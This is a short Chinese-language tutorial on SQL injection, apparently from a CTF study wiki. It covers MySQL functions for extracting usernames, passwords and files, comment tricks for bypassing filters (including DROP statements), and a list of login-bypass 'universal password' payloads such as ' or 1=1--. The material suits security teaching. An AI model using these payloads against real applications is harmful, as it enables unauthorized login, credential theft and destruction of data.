# SQL 注入

## 基本概念

* SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
* 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
* 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。

## 常用工具

* Burp Suite：[Burp Suite 使用介绍](http://static.hx99.net/static/drops/tools-1548.html)
* Tamper Data \(Firefox addon\)
* HackBar \(Firefox addon\)
* sqlmap：[sqlmap 用户手册](http://static.hx99.net/static/drops/tips-143.html)

## MySQL 注入简介

### 注入常见参数

* `user()`：当前数据库用户；
* `database()`：当前数据库名；
* `version()`：当前使用的数据库版本；
* `@@datadir`：数据库存储数据路径；
* `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`；
* `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来；
* `concat_ws()`：用法类似；
* `hex()` 和 `unhex()`：用于 hex 编码解码；
* `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`；
* `select xxoo into outfile '路径'`：权限较高时可直接写文件。


### 语法参考与小技巧

#### 行间注释

* `--`

  ```sql
  DROP sampletable;--
  ```

* `#`

  ```sql
  DROP sampletable;#
  ```

#### 行内注释

- `/*注释内容*/`

  ```sql
  DROP/*comment*/sampletable`
  DR/**/OP/*绕过过滤*/sampletable`
  SELECT/*替换空格*/password/**/FROM/**/Members
  ```

- `/*! MYSQL专属 */` 

  ```sql
  SELECT /*!32302 1/0, */ 1 FROM tablename
  ```


#### 字符串编码

* `ASCII()`：返回字符的 ASCII 码值；
* `CHAR()`：把整数转换为对应的字符。

## 后台万能密码

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- 以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

